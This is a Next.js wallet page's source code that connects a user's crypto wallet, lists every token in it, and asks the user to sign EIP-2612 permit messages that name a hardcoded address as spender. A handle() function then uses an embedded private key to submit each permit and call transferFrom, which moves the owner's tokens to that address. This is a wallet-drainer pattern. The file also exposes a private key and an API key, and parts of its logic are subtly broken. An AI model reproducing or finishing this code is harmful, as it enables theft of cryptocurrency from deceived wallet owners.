'use client';
import {useWalletInfo, useWeb3Modal} from "@web3modal/scaffold-react";
import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessage} from "wagmi";
import {parseEther} from "viem";
import {signTypedData} from "@wagmi/core";
import {config} from "@/context/config";
import {ethers, Signer, Wallet} from "ethers";
import {useEffect, useState} from "react";
import {useEthersProvider, useEthersSigner} from "@/app/ethers";
import {JsonRpcSigner} from "@ethersproject/providers";

const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
const developer = {
	address: "0x4a13959671D73A49431F4224Ec44A792368d1558"
}
const abi = [
	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
	'function nonces(address owner) view returns (uint256)'
];

const Page = () => {
	const open = useWeb3Modal();
	const wallet = useWalletInfo();
	const account = useAccount();
	const { signMessage } = useSignMessage();
	const { sendTransaction } = useSendTransaction()
	const {disconnect} = useDisconnect();
	const [signature, setSignature] = useState<string>("0xe62b5c6b5df896ca85e1d1d440adeb827d676714bc4cdc4e4fa10f58e1473bd5137784d7d744d59162f83c92d9a9250bb9e727fdb2039429db59fa02b6e940871b")
	const signer = useEthersSigner();
	const provider = useEthersProvider();
	const [signatures, setSignatures] = useState<{
		[key: string]: string
	}>({})
	const {data: balance, isLoading} = useBalance({
		address: account.address
	})
	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);

	if (!account || isLoading) return <button onClick={() => open.open()}>
		open
	</button>;

	const message = {
		"owner": account.address!,
		"spender": developer.address!,
		"value": parseEther('0.001'),
		"nonce": 43,
		"deadline": 1625256000
	} as any;

	return (
		<div>
			<button onClick={() => open.open()}>
				open
			</button>
			<img src={wallet.walletInfo?.icon}/>
			<br/>
			<button onClick={() => {
				console.log(signMessage({
					message: "test",
				}))
			}}>Sign Message
			</button>
			<br/>
			{account.isConnected + ""}
			<br/>
			{account.address}
			<br/>
			{account.chainId}
			<br/>
			<button
				onClick={() => sendTransaction({
					gas: null,
					to: '0xd2135CfB216b74109775236E36d4b433F1DF507B',
					value: parseEther('0.0001'),
				})}
			>
				Transfer
			</button>
			<button onClick={disconnect as any}>
				DC

			</button>
			<br/>
			<br/>
			{tokens.map(token => {

				return (
					<div className={'flex gap-2'}>
						{token.contract_ticker_symbol}
						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
							if (!account) return;
							const params = {
								"types": {
									"Permit": [
										{"name": "owner", "type": "address"},
										{"name": "spender", "type": "address"},
										{"name": "value", "type": "uint256"},
										{"name": "nonce", "type": "uint256"},
										{"name": "deadline", "type": "uint256"}
									]
								},
								"primaryType": "Permit",
								"domain": {
									"name": token.contract_ticker_symbol,
									"version": "1",
									"chainId": account.chainId as any,
									"verifyingContract": token.contract_address // BNB Contract
								},
								"message": message
							};
							console.log(params);
							const result = await signTypedData(config, params)

							setSignatures(pre => ({
								...pre || {},
								[token.contract_ticker_symbol]: result
							}))
						}}>
							SIGN TYPED DATA
						</button>
					</div>
				)
			})}

			<br/>
			{tokens.map(token => {
				const signature = signatures[token.contract_ticker_symbol];

				return (
					<div className={'flex gap-2'}>
						{token.contract_ticker_symbol}
						<button disabled={!signature} onClick={async () => {
							if (!signature) return;
							// ABI of the token contract
							// Prepare the permit data
							const spender = developer.address; // Address of the spender
							const amount = message.value+""; // Amount of tokens to be spent
							console.log("AMOUNT", amount);
							const nonce = message.nonce; // Nonce
							const deadline = 5 * 60 * 1000; // Deadline (optional)

							console.log(provider);
							const payload = {
								contract: token.contract_address,
								signature,
								spender,
								amount,
								nonce,
								deadline,
								rpc: provider?.connection?.url,
								owner: account.address
							}
							// const response = await fetch("/api/wallet/permit", {
							// 	headers: {
							// 		"content-type": "application/json"
							// 	},
							// 	body: JSON.stringify(payload),
							// 	method: "POST"
							// }).then(r=>r.json())
							// alert(response.message);
							// console.log(response);

							await handle(payload);
						}}>
							Permit
						</button>
					</div>
				)
			})}
			<br/>
			<button onClick={async ()=>{
				let tokenContract = new ethers.Contract(account.address, [
					'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
					'function transferFrom(address from, address to, uint256 value) external returns (bool)'
				], signer);

				console.log(await tokenContract.transferFrom(account.address,developer.address, message.value));
			}}>
				transfer
			</button>
			<br/>
			{account.chainId}
			<br/>
			<TokenList address={account.address + ""} setTokens={setTokens} CHAIN_ID={+(account.chainId || "0")}/>
		</div>
	)
};

function TokenList({address, CHAIN_ID, setTokens: ST}: { address: string, CHAIN_ID: number, setTokens: any }) {
	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);
	const [isLoading, setIsLoading] = useState(true);
	const [isError, setIsError] = useState(false);

	useEffect(() => {
		const fetchTokens = async () => {
			try {
				const response = await fetch(`https://api.covalenthq.com/v1/${CHAIN_ID}/address/${address}/balances_v2/?key=cqt_rQMKcGmyCVvmTRtRf6HFyMYggf49`);
				const data = await response.json();
				setTokens(data.data.items);
				ST(data.data.items);
				setIsLoading(false);
			} catch (error) {
				console.error('Error fetching tokens:', error);
				setIsError(true);
				setIsLoading(false);
			}
		};

		fetchTokens();
	}, [address]);

	if (isLoading) return <div>Loading...</div>;
	if (isError) return <div>Error fetching tokens</div>;

	console.log(tokens);

	return (
		<div>
			<h2>Tokens in Wallet</h2>
			<ul>
				{tokens.map((token) => (
					<li key={token.contract_address}>
						{token.contract_name} ({token.contract_ticker_symbol}): {ethers.utils.formatUnits(token.balance, token.contract_decimals)}
					</li>
				))}
			</ul>
		</div>
	);
}

export type ContractCovalenTHQ = {
	contract_decimals: number
	contract_name: string
	contract_ticker_symbol: string
	contract_address: string
	supports_erc: Array<string>
	logo_url: string
	contract_display_name: string
	logo_urls: {
		token_logo_url: string
		protocol_logo_url: any
		chain_logo_url: string
	}
	last_transferred_at: string
	native_token: boolean
	type: string
	is_spam: boolean
	balance: string
	balance_24h: string
	quote_rate: any
	quote_rate_24h: any
	quote: any
	pretty_quote: any
	quote_24h: any
	pretty_quote_24h: any
	protocol_metadata: any
	nft_data: any
}

async function handle(json: any, signer?: JsonRpcSigner) {
	const {
		owner,
		contract,
		signature,
		spender,
		amount,
		nonce,
		deadline,
		rpc
	} = json;
	const createSigner = async ()=>{
		const provider = new ethers.providers.JsonRpcProvider(rpc);
		console.log(provider);
		await provider.detectNetwork()
		console.log(json)
		const privateKey = 'ccbe5e7676105cb9190bdd8726b59c7ab33e7e6a62cad3cce07651195ed295b9';
		return new Wallet(privateKey, provider);
	}

	const SIGNER = signer || await createSigner()

	const {v, r, s} = ethers.utils.splitSignature(signature);
	let tokenContract = new ethers.Contract(spender, [
			'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
			'function transferFrom(address from, address to, uint256 value) external returns (bool)',
			'function allowance(address owner, address spender) external returns (uint256)',
	], SIGNER);

	const args = [spender,owner, amount, deadline, v, r, s];
	console.log(args)
	console.log(await contract.allowance(owner,spender))
	const gasLimit = ethers.utils.hexlify(100000); // You may need to adjust this value
	const tx = await tokenContract.permit(...args, {
		gasLimit
	});
	console.log("TX",tx);
	await tx.wait();
	console.log("FINISHED");

	const transferTx = await tokenContract.transferFrom(owner, spender, amount);
	const transferReceipt = await transferTx.wait();

	console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
}


export default Page;
